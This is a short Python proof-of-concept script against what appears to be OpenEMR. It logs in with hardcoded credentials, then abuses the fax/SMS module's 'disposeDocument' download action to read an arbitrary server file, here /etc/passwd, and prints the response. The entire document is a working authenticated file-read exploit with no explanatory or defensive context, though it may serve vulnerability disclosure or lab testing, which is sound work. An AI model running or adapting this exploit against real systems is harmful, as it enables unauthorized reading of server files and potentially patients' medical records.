import requests

target = "http://localhost:8080"
site = "default"
user = "NIU"
password = "Niu123@rezwan"
file_path = "/etc/passwd"

s = requests.Session()

s.get(f"{target}/interface/login/login.php", params={"site": site})
s.post(f"{target}/interface/main/main_screen.php",
       params={"auth": "login", "site": site},
       data={
           "new_login_session_management": "1",
           "authProvider": "Default",
           "authUser": user,
           "clearPass": password,
           "languageChoice": "1",
       })

print("Step 1 done: logged in as", user)

r = s.get(f"{target}/interface/modules/custom_modules/oe-module-faxsms/index.php",
          params={
              "site": site,
              "type": "fax",
              "_ACTION_COMMAND": "disposeDocument",
              "file_path": file_path,
              "action": "download",
          })

print("Step 2 done: sent the crafted request. Response below:")
print(r.text)
